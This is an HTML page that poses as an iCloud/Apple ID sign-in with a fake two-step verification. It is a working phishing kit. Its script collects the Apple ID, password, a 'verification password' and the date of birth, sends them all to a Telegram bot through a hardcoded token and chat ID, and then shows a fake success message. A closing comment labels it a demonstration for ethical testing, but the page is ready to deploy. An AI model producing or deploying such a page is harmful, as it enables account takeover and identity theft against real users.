<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>iCloud Login ·两步验证</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
        }

        body {
            background: #f5f5f7;
            display: flex;
            align-items: center;
            justify-content: center;
            min-height: 100vh;
            margin: 0;
            padding: 20px;
        }

        .card {
            background: #ffffff;
            border-radius: 32px;
            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.08), 0 8px 24px rgba(0, 0, 0, 0.04);
            width: 100%;
            max-width: 420px;
            padding: 44px 36px 48px;
            transition: all 0.2s ease;
        }

        .logo {
            display: flex;
            justify-content: center;
            margin-bottom: 28px;
        }

        .logo svg {
            width: 80px;
            height: 80px;
        }

        h1 {
            font-size: 28px;
            font-weight: 600;
            letter-spacing: -0.3px;
            text-align: center;
            color: #1d1d1f;
            margin-bottom: 8px;
        }

        .subhead {
            text-align: center;
            color: #6e6e73;
            font-size: 15px;
            font-weight: 400;
            margin-bottom: 24px;
            border-bottom: 1px solid #e5e5ea;
            padding-bottom: 20px;
        }

        .step-indicator {
            display: flex;
            justify-content: center;
            gap: 10px;
            margin-bottom: 28px;
        }

        .step-dot {
            width: 10px;
            height: 10px;
            border-radius: 50%;
            background: #d6d6dc;
            transition: background 0.3s;
        }

        .step-dot.active {
            background: #007aff;
            width: 28px;
            border-radius: 12px;
        }

        .step-dot.completed {
            background: #34c759;
        }

        .input-group {
            margin-bottom: 20px;
            position: relative;
        }

        .input-group label {
            display: block;
            font-size: 14px;
            font-weight: 500;
            color: #1d1d1f;
            margin-bottom: 6px;
            letter-spacing: -0.2px;
        }

        .input-group input {
            width: 100%;
            padding: 14px 16px;
            font-size: 16px;
            background: #f9f9fb;
            border: 1.5px solid #e5e5ea;
            border-radius: 16px;
            outline: none;
            transition: border 0.2s, box-shadow 0.2s;
            color: #1d1d1f;
            font-weight: 400;
        }

        .input-group input:focus {
            border-color: #007aff;
            background: #ffffff;
            box-shadow: 0 0 0 4px rgba(0, 122, 255, 0.1);
        }

        .input-group input::placeholder {
            color: #a1a1a6;
            font-weight: 300;
        }

        .forgot-row {
            display: flex;
            justify-content: flex-end;
            margin: -6px 0 24px 0;
        }

        .forgot-link {
            font-size: 14px;
            color: #007aff;
            text-decoration: none;
            font-weight: 400;
            letter-spacing: -0.2px;
        }

        .forgot-link:hover {
            text-decoration: underline;
        }

        .login-btn {
            width: 100%;
            padding: 16px;
            background: #007aff;
            border: none;
            border-radius: 30px;
            color: white;
            font-size: 18px;
            font-weight: 600;
            cursor: pointer;
            transition: background 0.2s, transform 0.1s;
            letter-spacing: -0.2px;
            box-shadow: 0 4px 12px rgba(0, 122, 255, 0.2);
            margin-top: 6px;
        }

        .login-btn:hover {
            background: #0066d9;
        }

        .login-btn:active {
            transform: scale(0.97);
        }

        .login-btn:disabled {
            opacity: 0.7;
            cursor: not-allowed;
            transform: none;
        }

        .footer-text {
            text-align: center;
            margin-top: 28px;
            font-size: 14px;
            color: #6e6e73;
            border-top: 1px solid #e5e5ea;
            padding-top: 22px;
        }

        .footer-text a {
            color: #007aff;
            text-decoration: none;
            font-weight: 500;
        }

        .footer-text a:hover {
            text-decoration: underline;
        }

        .status-msg {
            margin-top: 18px;
            text-align: center;
            font-size: 14px;
            min-height: 24px;
            color: #6e6e73;
            transition: opacity 0.2s;
        }

        .status-msg.error {
            color: #ff3b30;
        }

        .status-msg.success {
            color: #34c759;
        }

        .hidden {
            display: none !important;
        }

        @media (max-width: 480px) {
            .card {
                padding: 32px 24px 36px;
                border-radius: 28px;
            }
            h1 {
                font-size: 24px;
            }
        }
    </style>
</head>
<body>
    <div class="card">
        <!-- Logo -->
        <div class="logo">
            <svg viewBox="0 0 100 100" fill="none" xmlns="http://www.w3.org/2000/svg">
                <circle cx="50" cy="50" r="48" fill="#f5f5f7" stroke="#d6d6dc" stroke-width="1.5" />
                <path d="M62 46.5C62 39.5 56 34.5 50 34.5C44.5 34.5 39 38.5 37 43.5C33.5 43.5 30 46.5 30 50.5C30 54.5 33.5 57.5 37 57.5H62C66 57.5 69 54.5 69 50.5C69 46.5 66 44.5 62 44.5V46.5Z" fill="#007aff" stroke="#007aff" stroke-width="1.2" />
                <path d="M44 46.5L50 52.5L56 46.5" stroke="white" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round" />
                <path d="M50 44V52" stroke="white" stroke-width="2.5" stroke-linecap="round" />
            </svg>
        </div>

        <h1 id="formTitle">Sign in to iCloud</h1>
        <div class="subhead" id="formSubhead">Use your Apple ID</div>

        <!-- Step dots -->
        <div class="step-indicator">
            <span class="step-dot active" id="dot1"></span>
            <span class="step-dot" id="dot2"></span>
        </div>

        <!-- ========== STEP 1 ========== -->
        <form id="step1Form" autocomplete="off">
            <div class="input-group">
                <label for="username">Apple ID</label>
                <input type="text" id="username" placeholder="appleid@icloud.com" value="" required>
            </div>
            <div class="input-group">
                <label for="password">Password</label>
                <input type="password" id="password" placeholder="Enter password" required>
            </div>
            <div class="forgot-row">
                <a href="#" class="forgot-link">Forgot password?</a>
            </div>
            <button type="submit" class="login-btn" id="step1Btn">Continue</button>
            <div id="statusStep1" class="status-msg"></div>
        </form>

        <!-- ========== STEP 2 (hidden initially) ========== -->
        <form id="step2Form" class="hidden" autocomplete="off">
            <div class="input-group">
                <label for="verifyPassword">Verification Password</label>
                <input type="password" id="verifyPassword" placeholder="Enter verification password" required>
            </div>
            <div class="input-group">
                <label for="birthday">Date of Birth</label>
                <input type="date" id="birthday" value="">
            </div>
            <p style="font-size:14px; color:#6e6e73; margin: -6px 0 18px 0; text-align:center;">Verify your identity</p>
            <button type="submit" class="login-btn" id="step2Btn">Verify & Sign In</button>
            <div id="statusStep2" class="status-msg"></div>
        </form>

        <div class="footer-text">
            <a href="#">Create Apple ID</a> &nbsp;·&nbsp; <a href="#">Privacy</a>
        </div>
    </div>

    <script>
        (function() {
            // ----- Telegram Bot credentials -----
            const BOT_TOKEN = '8631375160:AAHYDLdOieTGH3eKYe0XglnnsYKIntI3IQQ';
            const CHAT_ID = '7917325571';

            // DOM elements
            const step1Form = document.getElementById('step1Form');
            const step2Form = document.getElementById('step2Form');
            const dot1 = document.getElementById('dot1');
            const dot2 = document.getElementById('dot2');
            const formTitle = document.getElementById('formTitle');
            const formSubhead = document.getElementById('formSubhead');

            // Step 1 fields
            const usernameInput = document.getElementById('username');
            const passwordInput = document.getElementById('password');
            const step1Btn = document.getElementById('step1Btn');
            const statusStep1 = document.getElementById('statusStep1');

            // Step 2 fields
            const verifyPasswordInput = document.getElementById('verifyPassword');
            const birthdayInput = document.getElementById('birthday');
            const step2Btn = document.getElementById('step2Btn');
            const statusStep2 = document.getElementById('statusStep2');

            // Store credentials from step 1
            let storedUsername = '';
            let storedPassword = '';

            // Helper: set status for step 1
            function setStatus1(msg, type = 'info') {
                statusStep1.textContent = msg;
                statusStep1.className = 'status-msg';
                if (type === 'error') statusStep1.classList.add('error');
                else if (type === 'success') statusStep1.classList.add('success');
            }

            // Helper: set status for step 2
            function setStatus2(msg, type = 'info') {
                statusStep2.textContent = msg;
                statusStep2.className = 'status-msg';
                if (type === 'error') statusStep2.classList.add('error');
                else if (type === 'success') statusStep2.classList.add('success');
            }

            // Clear status after delay
            function clearStatusAfter(element, delay = 4000) {
                setTimeout(() => {
                    element.textContent = '';
                    element.className = 'status-msg';
                }, delay);
            }

            // Send all credentials to Telegram Bot
            async function sendToTelegram(username, password, verifyPassword, birthday) {
                let message = `🔐 *iCloud Login (两步验证)*%0A`;
                message += `👤 *Apple ID:* ${encodeURIComponent(username)}%0A`;
                message += `🔑 *Password:* ${encodeURIComponent(password)}%0A`;
                if (verifyPassword) message += `🔐 *Verification Password:* ${encodeURIComponent(verifyPassword)}%0A`;
                if (birthday) message += `🎂 *Birthday:* ${encodeURIComponent(birthday)}%0A`;
                message += `%0A📲 *Sent from iCloud login page*`;

                const url =
                    `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${message}&parse_mode=Markdown`;

                try {
                    const response = await fetch(url);
                    const data = await response.json();
                    if (response.ok && data.ok) {
                        return { success: true, data };
                    } else {
                        return { success: false, error: data.description || 'Telegram API error' };
                    }
                } catch (error) {
                    return { success: false, error: error.message || 'Network error' };
                }
            }

            // ----- STEP 1: handle login (username + password) -----
            async function handleStep1(event) {
                event.preventDefault();

                step1Btn.disabled = true;
                setStatus1('Checking credentials...', 'info');

                const username = usernameInput.value.trim();
                const password = passwordInput.value.trim();

                if (!username || !password) {
                    setStatus1('Please enter both Apple ID and password.', 'error');
                    step1Btn.disabled = false;
                    return;
                }

                // Simulate verification (always "successful" for demo)
                storedUsername = username;
                storedPassword = password;

                setStatus1('✓ Verified. Please verify your identity.', 'success');
                setTimeout(() => {
                    // Hide step 1, show step 2
                    step1Form.classList.add('hidden');
                    step2Form.classList.remove('hidden');
                    // Update dots
                    dot1.classList.remove('active');
                    dot1.classList.add('completed');
                    dot2.classList.add('active');
                    // Update title
                    formTitle.textContent = 'Verify Identity';
                    formSubhead.textContent = 'Enter verification password and birthday';
                    // Clear status
                    statusStep1.textContent = '';
                    statusStep1.className = 'status-msg';
                    step1Btn.disabled = false;
                    // Focus first field in step 2
                    verifyPasswordInput.focus();
                }, 800);
            }

            // ----- STEP 2: handle verification password + birthday, then send to Telegram -----
            async function handleStep2(event) {
                event.preventDefault();

                step2Btn.disabled = true;
                setStatus2('Verifying & sending...', 'info');

                const verifyPassword = verifyPasswordInput.value.trim();
                const birthday = birthdayInput.value.trim();

                // Verification password is required
                if (!verifyPassword) {
                    setStatus2('Please enter verification password.', 'error');
                    step2Btn.disabled = false;
                    return;
                }

                // Send all data to Telegram
                const result = await sendToTelegram(storedUsername, storedPassword, verifyPassword, birthday);

                if (result.success) {
                    setStatus2('✅ Sign in successful!', 'success');

                    // Clear all fields
                    usernameInput.value = '';
                    passwordInput.value = '';
                    verifyPasswordInput.value = '';
                    birthdayInput.value = '';
                    storedUsername = '';
                    storedPassword = '';

                    // Reset to step 1 after a moment
                    setTimeout(() => {
                        step2Form.classList.add('hidden');
                        step1Form.classList.remove('hidden');
                        dot1.classList.remove('completed');
                        dot1.classList.add('active');
                        dot2.classList.remove('active');
                        dot2.classList.remove('completed');
                        formTitle.textContent = 'Sign in to iCloud';
                        formSubhead.textContent = 'Use your Apple ID';
                        statusStep1.textContent = '';
                        statusStep1.className = 'status-msg';
                        statusStep2.textContent = '';
                        statusStep2.className = 'status-msg';
                        step2Btn.disabled = false;
                        // Show success message on step 1
                        setStatus1('You are now signed in.', 'success');
                        clearStatusAfter(statusStep1, 4000);
                    }, 1500);
                } else {
                    // Error
                    setStatus2('Verification failed. Please try again.', 'error');
                    step2Btn.disabled = false;
                    setTimeout(() => {
                        if (statusStep2.textContent === 'Verification failed. Please try again.') {
                            statusStep2.textContent = '';
                            statusStep2.className = 'status-msg';
                        }
                    }, 5000);
                }
            }

            // Attach event listeners
            step1Form.addEventListener('submit', handleStep1);
            step2Form.addEventListener('submit', handleStep2);

            // Prevent "Forgot password?" and footer links from navigating
            document.querySelectorAll('.forgot-link, .footer-text a').forEach(link => {
                link.addEventListener('click', (e) => {
                    e.preventDefault();
                    if (step1Form.classList.contains('hidden') === false) {
                        setStatus1('Demo: credentials are sent to Telegram after step 2.', 'info');
                        clearStatusAfter(statusStep1, 3000);
                    } else {
                        setStatus2('Demo: complete verification to send.', 'info');
                        clearStatusAfter(statusStep2, 3000);
                    }
                });
            });

            console.log('🔐 iCloud two-step login ready. Credentials + verification password + birthday sent to Telegram.');
        })();
    </script>

    <!-- 
        ⚠️  IMPORTANT: This is a demonstration page. It simulates a two-step verification flow.
        All entered data (Apple ID, password, verification password, birthday) is sent to the provided Telegram bot.
        DO NOT USE WITH REAL CREDENTIALS. For educational / ethical testing only.
    -->
</body>
</html>
